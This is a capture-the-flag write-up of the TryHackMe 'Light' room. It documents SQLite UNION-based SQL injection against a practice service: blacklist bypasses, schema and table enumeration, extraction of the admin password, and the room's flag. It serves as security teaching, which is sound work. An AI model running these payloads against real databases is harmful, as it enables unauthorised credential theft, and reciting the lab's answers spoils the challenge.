# Light - TryHackMe Writeup

## Objective

The goal of this room was to retrieve the hidden flag from a vulnerable database service running on port 1337.

---

## Initial Enumeration

I connected to the service using Netcat.

```bash
nc <TARGET_IP> 1337
```

The application greeted me with:

```text
Welcome to the Light database!
Please enter your username:
```

I started by testing a given usernames.

```text
Please enter your username: smokey

Password: vYQ5ngPpw8AdUmL
```

Interesting.

The application returned a password when a valid username was supplied.

Testing other usernames produced a different result:

```text
Please enter your username: admin

Username not found.
```

At this point, it looked like the application was performing some sort of database lookup.

---

## Following the Hint

The room hinted that SQL Injection might be involved, so I started experimenting with special characters.

My first test was a single quote:

```text
Please enter your username: '

Error: unrecognized token: "''' LIMIT 30"
```

This was a very useful error.

The application appeared to be inserting my input directly into an SQL query and leaking database errors.

The mention of `LIMIT 30` also suggested that a query was running in the background.

---

## Testing Common SQL Injection Payloads

I attempted to use common comment syntax.

```text
Please enter your username: admin' --

For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Interesting.

The application was filtering common SQL comment characters.

I also tested:

```text
Please enter your username: ' # smokey

Error: unrecognized token: "#"
```

This suggested the backend database was likely SQLite.

Next, I tried using some common SQLite-related keywords.

```text
Please enter your username: SELECT sql FROM sqlite_schema

Ahh there is a word in there I don't like :(
```

Another filter.

At this point, it became clear that some keywords were blacklisted.

I would need to work around the restrictions.

---

## Enumerating Tables

After some experimentation, I decided to query SQLite's internal schema table.

Payload:

```sql
smokey' Union Select name FROM sqlite_master WHERE type='table
```

Output:

```text
Password: admintable
```

Success.

A hidden table called `admintable` had been discovered.

---

## Understanding the Table Structure

Finding the table name was only the first step.

I still needed to know what data was stored inside it.

Payload:

```sql
smokey' Union Select sql FROM sqlite_master WHERE name='admintable
```

Output:

```sql
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

Now everything started to make sense.

The table contained three columns:

```text
id
username
password
```

The next goal was obvious: enumerate the usernames.

---

## Enumerating Usernames

To retrieve usernames from the table, I used:

```sql
smokey' Union Select username FROM admintable WHERE username LIKE '%
```

Output:

```text
Password: TryHackMeAdmin
```

The application always displayed results using the label "Password", but the returned value was actually a username.

This revealed a promising account:

```text
TryHackMeAdmin
```

At this point I finally understood the flow of the challenge.

First find the table.

Then find the columns.

Then retrieve the usernames.

Finally retrieve the passwords.

---

## Failed Attempt

Before querying the administrator account directly, I experimented with a few payloads.

For example:

```sql
smokey' Union Select COUNT(username) FROM admintable WHERE 1'
```

Result:

```text
Error: near "''": syntax error
```

The payload failed because the final quote broke the SQL syntax.

Although it did not work, the error helped me better understand how my input was being inserted into the original query.

---

## Extracting Passwords

I first attempted:

```sql
smokey' Union Select password FROM admintable WHERE username='smokey
```

Output:

```text
Password: vYQ5ngPpw8AdUmL
```

This was not useful, i thought this username is just a decoy.

Now that I knew the correct administrator username, I adjusted the payload.

```sql
smokey' Union Select password FROM admintable WHERE username='TryHackMeAdmin
```

Output:

```text
Password: mamZtAuMlrsEy5bp6q17
```

Success.

Administrator credentials were recovered.

```text
Username: TryHackMeAdmin
Password: mamZtAuMlrsEy5bp6q17
```

---

## Retrieving the Flag

Finally, I queried all password entries.

Payload:

```sql
smokey' Union Select password FROM admintable WHERE username LIKE '%
```

Output:

```text
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

The challenge flag was successfully recovered.

---

## Conclusion

This room was a great introduction to SQLite-based SQL Injection.

The most valuable lesson was understanding the enumeration process:

1. Trigger an SQL error.
2. Identify the backend database.
3. Enumerate tables.
4. Enumerate columns.
5. Enumerate usernames.
6. Enumerate passwords.
7. Recover the flag.

I spent some time experimenting with payloads that failed, but those failures ultimately helped me understand how the application worked and made the successful exploitation much easier.
